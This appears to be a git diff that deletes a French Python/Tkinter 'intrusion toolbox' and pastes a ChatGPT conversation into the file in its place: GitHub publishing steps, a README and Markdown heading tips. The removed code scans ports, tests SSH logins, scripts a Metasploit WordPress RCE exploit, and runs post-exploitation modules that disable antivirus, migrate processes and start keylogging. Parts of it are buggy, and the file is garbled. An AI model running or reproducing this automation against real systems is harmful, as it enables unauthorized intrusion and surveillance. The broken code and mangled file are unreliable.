@@ -528,338 +528,318 @@ def main():
     root.mainloop()
 
 if __name__ == "__main__":
-                                      "Détecter les vulnérabilités",
-                                  "Analyser la sécurité des mots de passe",
-                                  "Exécuter des tests d'authentification",
-                                  "Exploitation de vulnérabilités",
-                                  "Analyse post-exploitation",
-                                  "Générer un rapport complet"]):
-            check_button = tk.Checkbutton(self.options_frame, text=text, variable=self.check_vars[i], bg="#2c3e50", fg="white", font=("Helvetica", 12), selectcolor="#3498db")
-            check_button.pack(anchor="w", pady=5)
-            self.check_buttons.append(check_button)
-
-        self.start_button = tk.Button(self.root, text="Démarrer", command=self.start, bg="#3498db", fg="white", font=("Helvetica", 12, "bold"))
-        self.start_button.pack(pady=20)
-
-        self.result_label = tk.Label(self.root, text="", bg="#2c3e50", fg="yellow", font=("Helvetica", 12))
-        self.result_label.pack(pady=20)
-
-        self.company_label = tk.Label(self.root, text="LOUIS-IT", bg="#2c3e50", fg="white", font=("Helvetica", 14, "italic"))
-        self.company_label.pack(side="bottom", pady=20)
-
-        self.show_custom_welcome_message()
-
-    def show_custom_welcome_message(self):
-        welcome_window = tk.Toplevel(self.root)
-        welcome_window.title("Bienvenue")
-        welcome_window.geometry("500x300")
-        welcome_window.configure(bg="#1e1e1e")
-
-        welcome_label = tk.Label(welcome_window, text="Bonjour Monsieur ou Madame,\n\nLa Société LOUIS-IT met à votre disposition cette toolbox pour tester votre système d'information.", bg="#1e1e1e", fg="#f39c12", font=("Helvetica", 14, "bold"))
-        welcome_label.pack(padx=20, pady=50)
-
-        close_button = tk.Button(welcome_window, text="Fermer", command=welcome_window.destroy, bg="#e74c3c", fg="white", font=("Helvetica", 12, "bold"))
-        close_button.pack(pady=10)
-
-    def start(self):
-        selected_options = [i+1 for i, var in enumerate(self.check_vars) if var.get() == 1]
-        if not selected_options:
-            messagebox.showwarning("Aucune fonctionnalité sélectionnée", "Veuillez sélectionner au moins une fonctionnalité.")
-            return
-        
-        for option in selected_options:
-            if option == 1:  # Explorer les ports et les services
-                self.explore_ports_and_services()
-            elif option == 2:  # Détecter les vulnérabilités
-                self.detect_vulnerabilities()
-            elif option == 3:  # Analyser la sécurité des mots de passe
-                self.analyze_passwords()
-            elif option == 4:  # Exécuter des tests d'authentification
-                self.run_authentication_tests()
-            elif option == 5:  # Exploitation de vulnérabilités
-                self.exploit_vulnerabilities()
-            elif option == 6:  # Analyse post-exploitation
-                self.post_exploitation_analysis()
-            elif option == 7:  # Générer un rapport complet
-                self.generate_report(selected_options, complete=True)
-
-    def explore_ports_and_services(self):
-        target = simpledialog.askstring("Adresse IP de la cible", "Entrez l'adresse IP de la cible : ")
-        if target:
-            ports_status = self.scan_ports(target)
-            self.generate_report_entry("Explorer les ports et les services", ports_status, target)
-            self.generate_report(["Explorer les ports et les services"], complete=False)
-
-    def scan_ports(self, target):
-        ports_status = {}
-        for port in range(1, 1025):
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            result = sock.connect_ex((target, port))
-            if result == 0:
-                ports_status[port] = "Open"
-            else:
-                ports_status[port] = "Closed"
-            sock.close()
-        return ports_status
-
-    def detect_vulnerabilities(self):
-        nm = nmap.PortScanner()
-        target = simpledialog.askstring("Adresse IP de la cible", "Entrez l'adresse IP de la cible : ")
-        if target:
-            try:
-                nm.scan(target, arguments='-sV')
-                vulnerabilities = {}
-                for host in nm.all_hosts():
-                    if 'tcp' in nm[host]:
-                        for port in nm[host]['tcp']:
-                            state = nm[host]['tcp'][port]['state']
-                            service = nm[host]['tcp'][port]['name']
-                            version = nm[host]['tcp'][port].get('version', 'N/A')
-                            vulnerabilities[port] = {
-                                'state': state,
-                                'service': service,
-                                'version': version,
-                                'vulnerable': self.check_port_vulnerability(port)
-                            }
-                self.generate_report_entry("Détecter les vulnérabilités", vulnerabilities, target)
-                self.generate_report(["Détecter les vulnérabilités"], complete=False)
-            except nmap.PortScannerError as e:
-                messagebox.showerror("Erreur Nmap", f"Erreur lors du scan Nmap : {e}")
-            except Exception as e:
-                messagebox.showerror("Erreur inconnue", f"Erreur inconnue : {e}")
-
-    def check_port_vulnerability(self, port):
-        if port in PORTS_IANA_INFO:
-            return f"Port {port} ({PORTS_IANA_INFO[port]}) a une vulnérabilité connue. Vous pouvez essayer d'exploiter cette vulnérabilité avec Metasploit ou un autre outil d'exploitation."
-        return "Pas de vulnérabilité connue pour ce port."
-
-    def analyze_passwords(self):
-        password = simpledialog.askstring("Analyse de mot de passe", "Entrez le mot de passe à analyser : ", show='*')
-        if password:
-            strength = self.evaluate_password_strength(password)
-            self.generate_report_entry("Analyser la sécurité des mots de passe", {"password": password, "strength": strength}, "N/A")
-            self.generate_report(["Analyser la sécurité des mots de passe"], complete=False)
-            messagebox.showinfo("Force du mot de passe", f"La force du mot de passe est : {strength}")
-
-    def evaluate_password_strength(self, password):
-        length = len(password)
-        if length < 6:
-            return "Faible"
-        if length < 10:
-            return "Moyen"
-        if re.search(r"[A-Z]", password) and re.search(r"[a-z]", password) and re.search(r"[0-9]", password) and re.search(r"[^A-Za-z0-9]", password):
-            return "Fort"
-        return "Moyen"
-
-    def run_authentication_tests(self):
-        target = simpledialog.askstring("Adresse IP de la cible", "Entrez l'adresse IP de la cible : ")
-        if target:
-            self.username = simpledialog.askstring("Nom d'utilisateur", "Entrez le nom d'utilisateur : ")
-            self.password = simpledialog.askstring("Mot de passe", "Entrez le mot de passe : ", show='*')
-            if self.username and self.password:
-                success = self.authenticate(target, self.username, self.password)
-                self.generate_report_entry("Exécuter des tests d'authentification", {"username": self.username, "success": success}, target)
-                self.generate_report(["Exécuter des tests d'authentification"], complete=False)
-                messagebox.showinfo("Résultat de l'authentification", "Authentification réussie." if success else "Échec de l'authentification.")
-
-    def authenticate(self, target, username, password):
-        ssh = paramiko.SSHClient()
-        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-        try:
-            ssh.connect(target, username=username, password=password)
-            ssh.close()
-            return True
-        except paramiko.AuthenticationException:
-            return False
-
-    def exploit_vulnerabilities(self):
-        target = simpledialog.askstring("Adresse IP de la cible", "Entrez l'adresse IP de la cible : ")
-        if target:
-            self.run_metasploit_exploit(target)
-            self.generate_report_entry("Exploiter les vulnérabilités", {"target": target}, target)
-            self.generate_report(["Exploiter les vulnérabilités"], complete=False)
-
-    def run_metasploit_exploit(self, target):
-        child = pexpect.spawn('msfconsole', ['-q'], timeout=300)
-        child.logfile = sys.stdout.buffer
-        child.expect('msf6 >', timeout=300)
-        child.sendline('use exploit/multi/http/wp_crop_rce')
-        child.expect('msf6 exploit(multi/http/wp_crop_rce) >', timeout=300)
-        child.sendline(f'set RHOSTS {target}')
-        child.expect('RHOSTS =>', timeout=300)
-        child.sendline(f'set USERNAME {self.username}')
-        child.expect('USERNAME =>', timeout=300)
-        child.sendline(f'set PASSWORD {self.password}')
-        child.expect('PASSWORD =>', timeout=300)
-        child.sendline('exploit')
-        child.expect('msf6 exploit(multi/http/wp_crop_rce) >', timeout=300)
-        print(child.before.decode('utf-8'))
-        child.sendline('exit')
-        child.close()
-
-    def post_exploitation_analysis(self):
-        session = simpledialog.askstring("Session Meterpreter", "Entrez le numéro de session Meterpreter : ")
-        if session:
-            self.disable_antivirus(session)
-            self.search_interesting_files()
-            pid = simpledialog.askstring("PID de migration", "Entrez le PID du processus de migration : ")
-            if pid:
-                self.migrate_process(pid)
-                self.keylogging()
-                self.generate_report_entry("Analyse post-exploitation", {"session": session, "pid": pid}, session)
-                self.generate_report(["Analyse post-exploitation"], complete=False)
-
-    def disable_antivirus(self, session):
-        result = subprocess.run(["msfconsole", "-q", "-x", f"use post/windows/manage/killav; set SESSION {session}; exploit"], capture_output=True, text=True)
-        print(result.stdout)
-
-    def search_interesting_files(self):
-        result = subprocess.run(["msfconsole", "-q", "-x", "use post/multi/gather/search; search -f *.pdf"], capture_output=True, text=True)
-        print(result.stdout)
-
-    def migrate_process(self, pid):
-        result = subprocess.run(["msfconsole", "-q", "-x", f"session -i {self.session}; migrate {pid}"], capture_output=True, text=True)
-        print(result.stdout)
-
-    def keylogging(self):
-        result = subprocess.run(["msfconsole", "-q", "-x", "session -i {self.session}; keyscan_start"], capture_output=True, text=True)
-        print(result.stdout)
-
-    def generate_report_entry(self, title, data, target):
-        self.report_data.append((title, data, target))
-
-    def generate_report(self, selected_options, complete=False):
-        if complete:
-            report_filename = f"rapport_complet_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.pdf"
-        else:
-            report_filename = f"rapport_option_{selected_options[0]}_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.pdf"
-
-        doc = SimpleDocTemplate(report_filename, pagesize=A4)
-        styles = getSampleStyleSheet()
-        styles.add(ParagraphStyle(name='Justify', alignment=4))
-        report_content = []
-
-        # Couverture du rapport
-        report_content.append(Paragraph("Rapport de Sécurité", styles["Title"]))
-        report_content.append(Paragraph(f"Date et heure du test : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}", styles["Normal"]))
-        report_content.append(Spacer(1, 12))
-
-        for title, data, target in self.report_data:
-            intro_text = self.get_report_intro(title)
-            report_content.append(Paragraph(intro_text, styles["Normal"]))
-            report_content.append(Spacer(1, 12))
-
-            color = COLOR_SCHEMES.get(title, colors.white)
-            report_content.append(Spacer(1, 12))
-
-            report_content.append(Paragraph(f"--- {title} ---", ParagraphStyle(name="ColoredHeading", fontSize=14, textColor=colors.black, backColor=color, spaceAfter=12)))
-            report_content.append(Paragraph(f"Adresse IP de la cible : {target}", styles["Normal"]))
-            report_content.append(Spacer(1, 12))
-
-            if title == "Explorer les ports et les services":
-                table_data = [["Port", "Statut", "Service"]]
-                for port, status in data.items():
-                    service = PORTS_IANA_INFO.get(port, "Inconnu")
-                    table_data.append([port, status, service])
-                table = Table(table_data, colWidths=[100, 100, 300])
-                table.setStyle(TableStyle([('BACKGROUND', (0, 0), (-1, 0), colors.lightblue),
-                                           ('TEXTCOLOR', (0, 0), (-1, 0), colors.whitesmoke),
-                                           ('ALIGN', (0, 0), (-1, -1), 'CENTER'),
-                                           ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
-                                           ('BOTTOMPADDING', (0, 0), (-1, 0), 12),
-                                           ('BACKGROUND', (0, 1), (-1, -1), colors.beige),
-                                           ('GRID', (0, 0), (-1, -1), 1, colors.black)]))
-                report_content.append(table)
-            elif title == "Détecter les vulnérabilités":
-                table_data = [["Port", "Service", "Version", "Vulnérable"]]
-                for port, details in data.items():
-                    table_data.append([port, details['service'], details['version'], details['vulnerable']])
-                table = Table(table_data, colWidths=[100, 100, 200, 200])
-                table.setStyle(TableStyle([('BACKGROUND', (0, 0), (-1, 0), colors.lightgreen),
-                                           ('TEXTCOLOR', (0, 0), (-1, 0), colors.whitesmoke),
-                                           ('ALIGN', (0, 0), (-1, -1), 'CENTER'),
-                                           ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
-                                           ('BOTTOMPADDING', (0, 0), (-1, 0), 12),
-                                           ('BACKGROUND', (0, 1), (-1, -1), colors.beige),
-                                           ('GRID', (0, 0), (-1, -1), 1, colors.black)]))
-                report_content.append(table)
-            elif title == "Analyser la sécurité des mots de passe":
-                line = f"Mot de passe : {'*' * len(data['password'])} - Force : {data['strength']}"
-                report_content.append(Paragraph(line, styles["Normal"]))
-            elif title == "Exécuter des tests d'authentification":
-                line = f"Nom d'utilisateur : {data['username']} - Succès : {'Oui' if data['success'] else 'Non'}"
-                report_content.append(Paragraph(line, styles["Normal"]))
-            elif title == "Exploiter les vulnérabilités":
-                line = f"Cible : {data['target']}"
-                report_content.append(Paragraph(line, styles["Normal"]))
-            elif title == "Analyse post-exploitation":
-                line = f"Session : {data['session']} - PID : {data['pid']}"
-                report_content.append(Paragraph(line, styles["Normal"]))
-
-            report_content.append(Spacer(1, 12))
-
-        self.add_graphs_to_report(report_content)
-
-        doc.build(report_content)
-        print(f"Rapport généré : {report_filename}")
-
-    def get_report_intro(self, title):
-        intros = {
-            "Explorer les ports et les services": (
-                "Ce rapport présente les résultats de l'exploration des ports et des services "
-                "pour la cible spécifiée. Il identifie les ports ouverts ainsi que les services "
-                "qui y sont associés. Cette étape est cruciale pour comprendre la surface d'attaque "
-                "disponible sur le système cible."
-            ),
-            "Détecter les vulnérabilités": (
-                "Ce rapport détaille les vulnérabilités détectées sur les services en cours d'exécution "
-                "sur la cible. En identifiant les versions des services et en recherchant des vulnérabilités connues, "
-                "ce rapport aide à évaluer les risques potentiels auxquels le système est exposé. Il inclut également des "
-                "suggestions sur la manière dont ces vulnérabilités peuvent être exploitées."
-            ),
-            "Analyser la sécurité des mots de passe": (
-                "Ce rapport évalue la robustesse du mot de passe fourni en analysant sa longueur, "
-                "sa complexité et d'autres critères de sécurité. Cette analyse est essentielle pour assurer "
-                "que les mots de passe utilisés sont suffisamment sécurisés pour protéger les ressources critiques."
-            ),
-            "Exécuter des tests d'authentification": (
-                "Ce rapport présente les résultats des tests d'authentification réalisés avec les informations "
-                "d'identification fournies. En testant la validité des noms d'utilisateur et des mots de passe, "
-                "il est possible de vérifier la robustesse des mécanismes d'authentification du système cible."
-            ),
-            "Exploiter les vulnérabilités": (
-                "Ce rapport décrit les tentatives d'exploitation des vulnérabilités détectées sur la cible. "
-                "En utilisant des outils d'exploitation comme Metasploit, ce rapport montre les potentiels accès non autorisés "
-                "qui peuvent être obtenus et les actions pouvant être entreprises suite à ces accès."
-            ),
-            "Analyse post-exploitation": (
-                "Ce rapport documente les actions de post-exploitation effectuées après avoir obtenu un accès initial à la cible. "
-                "Il comprend des activités telles que la recherche de fichiers sensibles, la désactivation des antivirus et la "
-                "migration des processus. Ces étapes permettent de comprendre l'impact d'une intrusion réussie."
-            )
-        }
-        return intros.get(title, "")
-
-    def add_graphs_to_report(self, report_content):
-        plt.figure(figsize=(6, 4))
-        ports = list(PORTS_IANA_INFO.keys())
-        statuses = ["Open", "Closed"]
-        counts = [sum(1 for port in ports if PORTS_IANA_INFO[port] == status) for status in statuses]
-
-        plt.bar(statuses, counts, color=['green', 'red'])
-        plt.xlabel('Statut')
-        plt.ylabel('Nombre de ports')
-        plt.title('Statut des ports')
-        graph_filename = 'graph_ports_status.png'
-        plt.savefig(graph_filename)
-        plt.close()
-        report_content.append(ReportLabImage(graph_filename))
-
-def main():
-    root = tk.Tk()
-    app = BoiteOutilsGUI(root)
-    root.mainloop()
-
-if __name__ == "__main__":
     main()
+
+Publier sur GitHub
+Créez un dépôt sur GitHub : Allez sur GitHub et créez un nouveau dépôt.
+
+Ajoutez votre projet à GitHub : Utilisez les commandes suivantes pour ajouter votre projet au dépôt GitHub.
+
+sh
+Copier le code
+git init
+git add .
+git commit -m "Initial commit"
+git branch -M main
+git remote add origin https://github.com/votre_nom_d_utilisateur/Toolbox_IT.git
+git push -u origin main
+README.md
+Assurez-vous d'ajouter le README.md au projet et de le pousser sur GitHub avec les fichiers de votre projet.
+
+markdown
+Copier le code
+# Toolbox IT
+
+Toolbox IT est un outil de test d'intrusion simple et intuitif conçu pour évaluer la sécurité des systèmes d'information. Il offre une interface graphique conviviale pour effectuer diverses tâches de sécurité telles que l'exploration de ports, la détection de vulnérabilités, l'analyse de la sécurité des mots de passe, et bien plus encore.
+
+## Fonctionnalités
+
+- **Explorer les ports et les services** : Scanne les ports ouverts et identifie les services associés.
+- **Détecter les vulnérabilités** : Analyse les services pour détecter des vulnérabilités connues.
+- **Analyser la sécurité des mots de passe** : Évalue la robustesse des mots de passe.
+- **Exécuter des tests d'authentification** : Vérifie les informations d'identification pour les connexions SSH.
+- **Exploiter les vulnérabilités** : Tente d'exploiter les vulnérabilités identifiées pour accéder au système cible.
+- **Analyse post-exploitation** : Effectue une analyse approfondie après l'exploitation pour identifier les données sensibles et les mesures de sécurité en place.
+
+## Prérequis
+
+Assurez-vous d'avoir les dépendances suivantes installées :
+
+- Python 3
+- tkinter
+- nmap
+- paramiko
+- pexpect
+- reportlab
+- matplotlib
+- pyinstaller (pour créer un exécutable)
+
+Installez les dépendances en utilisant pip :
+
+```sh
+pip install python-nmap paramiko pexpect reportlab matplotlib pyinstaller
+Installation
+Clonez le dépôt GitHub :
+
+sh
+Copier le code
+git clone https://github.com/votre_nom_d_utilisateur/Toolbox_IT.git
+cd Toolbox_IT
+Exécutez le script pour créer un raccourci sur votre bureau :
+
+sh
+Copier le code
+sudo python3 create_shortcut.py
+Utilisation
+Une fois le raccourci créé, double-cliquez sur l'icône "Toolbox IT" sur votre bureau pour lancer l'interface graphique. Vous pouvez ensuite sélectionner les fonctionnalités que vous souhaitez utiliser et suivre les instructions à l'écran.
+
+Détails des Scripts
+create_shortcut.py
+Ce script crée un répertoire Toolbox_IT dans le répertoire personnel de l'utilisateur, copie les fichiers nécessaires, et crée un raccourci sur le bureau avec une icône générique. Voici les principales étapes du script :
+
+create_directories : Crée les répertoires nécessaires et copie les fichiers.
+create_linux_shortcut : Crée un raccourci sur le bureau avec une icône générique.
+main : Gère le processus d'installation et de création du raccourci.
+python_intrusion_toolbox.py
+Ce script constitue le cœur de la toolbox, fournissant l'interface graphique et les fonctionnalités de test d'intrusion. Voici quelques-unes des principales fonctions :
+
+explore_ports_and_services : Scanne les ports ouverts et identifie les services.
+detect_vulnerabilities : Utilise nmap pour détecter les vulnérabilités des services.
+analyze_passwords : Évalue la force des mots de passe.
+run_authentication_tests : Vérifie les informations d'identification SSH.
+exploit_vulnerabilities : Tente d'exploiter les vulnérabilités avec Metasploit.
+post_exploitation_analysis : Effectue des actions post-exploitation comme la recherche de fichiers sensibles et la désactivation des antivirus.
+Contributions
+Les contributions sont les bienvenues. Veuillez soumettre des pull requests ou ouvrir des issues pour discuter des modifications proposées.
+
+Licence
+Ce projet est sous licence MIT. Voir le fichier LICENSE pour plus de détails.
+
+Copier le code
+
+continue
+ChatGPT
+README.md (suite)
+Exécution et Démonstration
+Démarrage de l'application
+Une fois toutes les étapes d'installation et de configuration terminées, vous pouvez lancer l'application en double-cliquant sur l'icône "Toolbox IT" sur votre bureau. L'interface graphique de la toolbox s'ouvrira et vous pourrez sélectionner les différentes fonctionnalités disponibles pour tester la sécurité de votre système.
+
+Fonctionnalités détaillées
+Explorer les ports et les services :
+
+Description : Cette fonctionnalité scanne les ports ouverts de la cible spécifiée et identifie les services associés à ces ports.
+Utilisation : Sélectionnez l'option "Explorer les ports et les services" et entrez l'adresse IP de la cible. Le rapport généré listera les ports ouverts et les services associés.
+Détecter les vulnérabilités :
+
+Description : Cette fonctionnalité analyse les services en cours d'exécution sur la cible pour détecter des vulnérabilités connues.
+Utilisation : Sélectionnez l'option "Détecter les vulnérabilités" et entrez l'adresse IP de la cible. Le rapport généré détaillera les vulnérabilités détectées, y compris les versions des services et des suggestions sur la manière dont elles peuvent être exploitées.
+Analyser la sécurité des mots de passe :
+
+Description : Cette fonctionnalité évalue la robustesse des mots de passe fournis en analysant leur longueur et leur complexité.
+Utilisation : Sélectionnez l'option "Analyser la sécurité des mots de passe" et entrez le mot de passe à analyser. Le rapport généré évaluera la force du mot de passe.
+Exécuter des tests d'authentification :
+
+Description : Cette fonctionnalité vérifie les informations d'identification pour les connexions SSH.
+Utilisation : Sélectionnez l'option "Exécuter des tests d'authentification" et entrez l'adresse IP de la cible, le nom d'utilisateur et le mot de passe. Le rapport généré indiquera si l'authentification a réussi.
+Exploiter les vulnérabilités :
+
+Description : Cette fonctionnalité tente d'exploiter les vulnérabilités identifiées pour obtenir un accès non autorisé au système cible.
+Utilisation : Sélectionnez l'option "Exploiter les vulnérabilités" et entrez l'adresse IP de la cible. Le rapport généré détaillera les tentatives d'exploitation et leurs résultats.
+Analyse post-exploitation :
+
+Description : Cette fonctionnalité effectue une analyse approfondie après l'exploitation pour identifier les données sensibles et les mesures de sécurité en place.
+Utilisation : Sélectionnez l'option "Analyse post-exploitation" et entrez les informations requises. Le rapport généré documentera les actions de post-exploitation effectuées.
+Générer un rapport complet :
+
+Description : Cette fonctionnalité génère un rapport complet incluant toutes les analyses sélectionnées.
+Utilisation : Sélectionnez l'option "Générer un rapport complet". Le rapport généré comprendra toutes les analyses effectuées.
+Notes et Conseils
+Sécurité : Assurez-vous de disposer des autorisations appropriées pour effectuer des tests d'intrusion sur les cibles spécifiées. L'utilisation non autorisée de ces outils peut être illégale.
+Configuration : Pour une meilleure expérience, assurez-vous que les dépendances sont correctement installées et que les configurations réseau sont appropriées.
+Personnalisation : Vous pouvez personnaliser davantage l'application en modifiant les scripts selon vos besoins spécifiques.
+Conclusion
+Toolbox IT est conçu pour être un outil polyvalent et convivial pour les professionnels de la sécurité informatique. En fournissant une gamme complète de fonctionnalités pour tester et analyser la sécurité des systèmes, il permet aux utilisateurs de mieux comprendre les vulnérabilités et de prendre des mesures pour sécuriser leurs infrastructures.
+
+Nous espérons que vous trouverez cet outil utile et nous vous invitons à contribuer à son développement continu.
+
+N'oubliez pas de remplacer votre_nom_d_utilisateur par votre nom d'utilisateur GitHub réel dans les commandes de clonage et de soumission des modifications.
+
+Pour toute question ou assistance supplémentaire, n'hésitez pas à ouvrir une issue sur GitHub ou à contacter l'équipe de développement.
+
+Licence
+Ce projet est sous licence MIT. Voir le fichier LICENSE pour plus de détails.
+
+Ce fichier README.md est structuré pour fournir une compréhension claire et complète de votre projet Toolbox IT, y compris les fonctionnalités, l'installation, l'utilisation, et les détails techniques. Il sert également de guide pour les contributeurs potentiels.
+
+comment faire des nouveaux  grands titres dans le read me
+ChatGPT
+Pour ajouter de nouveaux grands titres dans un fichier README.md en utilisant la syntaxe Markdown, vous pouvez utiliser les hashtags (#). Plus vous utilisez de hashtags, plus le niveau de titre est bas. Voici un exemple :
+
+# pour un titre de niveau 1
+## pour un titre de niveau 2
+### pour un titre de niveau 3
+Voici un exemple de comment structurer un README.md avec différents niveaux de titres :
+
+markdown
+Copier le code
+# Nom du Projet
+
+## Description
+
+Une brève description de votre projet.
+
+## Prérequis
+
+Les prérequis pour utiliser le projet :
+
+- Prérequis 1
+- Prérequis 2
+
+## Installation
+
+Les étapes pour installer le projet :
+
+```sh
+# Clonez le dépôt
+git clone https://github.com/votre_nom_d_utilisateur/nom_du_projet.git
+
+# Déplacez-vous dans le répertoire du projet
+cd nom_du_projet
+
+# Installez les dépendances
+pip install -r requirements.txt
+Utilisation
+Comment utiliser le projet :
+
+Étape 1
+Étape 2
+Étape 3
+Fonctionnalités
+Les fonctionnalités principales du projet :
+
+Fonctionnalité 1
+Fonctionnalité 2
+Fonctionnalité 3
+Contribuer
+Comment contribuer au projet :
+
+Fork le projet
+Créez une branche pour votre fonctionnalité (git checkout -b feature/AmazingFeature)
+Committez vos modifications (git commit -m 'Add some AmazingFeature')
+Poussez à la branche (git push origin feature/AmazingFeature)
+Ouvrez une Pull Request
+Licence
+Distribué sous la licence MIT. Voir LICENSE pour plus d'informations.
+
+diff
+Copier le code
+
+En utilisant cette structure, vous pouvez créer un fichier `README.md` bien organisé et facile à naviguer.
+
+Voici la version complète du `README.md` pour votre projet Toolbox IT avec les nouveaux titres ajoutés :
+
+### README.md complet
+
+```markdown
+# Toolbox IT
+
+Toolbox IT est un outil de test d'intrusion simple et intuitif conçu pour évaluer la sécurité des systèmes d'information. Il offre une interface graphique conviviale pour effectuer diverses tâches de sécurité telles que l'exploration de ports, la détection de vulnérabilités, l'analyse de la sécurité des mots de passe, et bien plus encore.
+
+## Fonctionnalités
+
+- **Explorer les ports et les services** : Scanne les ports ouverts et identifie les services associés.
+- **Détecter les vulnérabilités** : Analyse les services pour détecter des vulnérabilités connues.
+- **Analyser la sécurité des mots de passe** : Évalue la robustesse des mots de passe.
+- **Exécuter des tests d'authentification** : Vérifie les informations d'identification pour les connexions SSH.
+- **Exploiter les vulnérabilités** : Tente d'exploiter les vulnérabilités identifiées pour accéder au système cible.
+- **Analyse post-exploitation** : Effectue une analyse approfondie après l'exploitation pour identifier les données sensibles et les mesures de sécurité en place.
+
+## Prérequis
+
+Assurez-vous d'avoir les dépendances suivantes installées :
+
+- Python 3
+- tkinter
+- nmap
+- paramiko
+- pexpect
+- reportlab
+- matplotlib
+- pyinstaller (pour créer un exécutable)
+
+Installez les dépendances en utilisant pip :
+
+```sh
+pip install python-nmap paramiko pexpect reportlab matplotlib pyinstaller
+Installation
+Cloner le dépôt
+Clonez le dépôt GitHub :
+
+sh
+Copier le code
+git clone https://github.com/votre_nom_d_utilisateur/Toolbox_IT.git
+cd Toolbox_IT
+Créer le raccourci
+Exécutez le script pour créer un raccourci sur votre bureau :
+
+sh
+Copier le code
+sudo python3 create_shortcut.py
+Utilisation
+Démarrage de l'application
+Une fois le raccourci créé, double-cliquez sur l'icône "Toolbox IT" sur votre bureau pour lancer l'interface graphique. Vous pouvez ensuite sélectionner les fonctionnalités que vous souhaitez utiliser et suivre les instructions à l'écran.
+
+Fonctionnalités détaillées
+Explorer les ports et les services :
+
+Description : Cette fonctionnalité scanne les ports ouverts de la cible spécifiée et identifie les services associés à ces ports.
+Utilisation : Sélectionnez l'option "Explorer les ports et les services" et entrez l'adresse IP de la cible. Le rapport généré listera les ports ouverts et les services associés.
+Détecter les vulnérabilités :
+
+Description : Cette fonctionnalité analyse les services en cours d'exécution sur la cible pour détecter des vulnérabilités connues.
+Utilisation : Sélectionnez l'option "Détecter les vulnérabilités" et entrez l'adresse IP de la cible. Le rapport généré détaillera les vulnérabilités détectées, y compris les versions des services et des suggestions sur la manière dont elles peuvent être exploitées.
+Analyser la sécurité des mots de passe :
+
+Description : Cette fonctionnalité évalue la robustesse des mots de passe fournis en analysant leur longueur et leur complexité.
+Utilisation : Sélectionnez l'option "Analyser la sécurité des mots de passe" et entrez le mot de passe à analyser. Le rapport généré évaluera la force du mot de passe.
+Exécuter des tests d'authentification :
+
+Description : Cette fonctionnalité vérifie les informations d'identification pour les connexions SSH.
+Utilisation : Sélectionnez l'option "Exécuter des tests d'authentification" et entrez l'adresse IP de la cible, le nom d'utilisateur et le mot de passe. Le rapport généré indiquera si l'authentification a réussi.
+Exploiter les vulnérabilités :
+
+Description : Cette fonctionnalité tente d'exploiter les vulnérabilités identifiées pour obtenir un accès non autorisé au système cible.
+Utilisation : Sélectionnez l'option "Exploiter les vulnérabilités" et entrez l'adresse IP de la cible. Le rapport généré détaillera les tentatives d'exploitation et leurs résultats.
+Analyse post-exploitation :
+
+Description : Cette fonctionnalité effectue une analyse approfondie après l'exploitation pour identifier les données sensibles et les mesures de sécurité en place.
+Utilisation : Sélectionnez l'option "Analyse post-exploitation" et entrez les informations requises. Le rapport généré documentera les actions de post-exploitation effectuées.
+Générer un rapport complet :
+
+Description : Cette fonctionnalité génère un rapport complet incluant toutes les analyses sélectionnées.
+Utilisation : Sélectionnez l'option "Générer un rapport complet". Le rapport généré comprendra toutes les analyses effectuées.
+Notes et Conseils
+Sécurité : Assurez-vous de disposer des autorisations appropriées pour effectuer des tests d'intrusion sur les cibles spécifiées. L'utilisation non autorisée de ces outils peut être illégale.
+Configuration : Pour une meilleure expérience, assurez-vous que les dépendances sont correctement installées et que les configurations réseau sont appropriées.
+Personnalisation : Vous pouvez personnaliser davantage l'application en modifiant les scripts selon vos besoins spécifiques.
+Conclusion
+Toolbox IT est conçu pour être un outil polyvalent et convivial pour les professionnels de la sécurité informatique. En fournissant une gamme complète de fonctionnalités pour tester et analyser la sécurité des systèmes, il permet aux utilisateurs de mieux comprendre les vulnérabilités et de prendre des mesures pour sécuriser leurs infrastructures.
+
+Nous espérons que vous trouverez cet outil utile et nous vous invitons à contribuer à son développement continu.
+
+Contributions
+Les contributions sont les bienvenues. Veuillez soumettre des pull requests ou ouvrir des issues pour discuter des modifications proposées.
+
+Licence
+Ce projet est sous licence MIT. Voir le fichier LICENSE pour plus de détails.
+
+go
+Copier le code
+
+Ce fichier `README.md` est maintenant structuré avec des titres clairs et hiérarchisés, ce qui le rend facile à lire et à naviguer. Vous pouvez ajouter, modifier ou supprimer des sections selon vos besoins spécifiques.
+
+
+
+
+
 
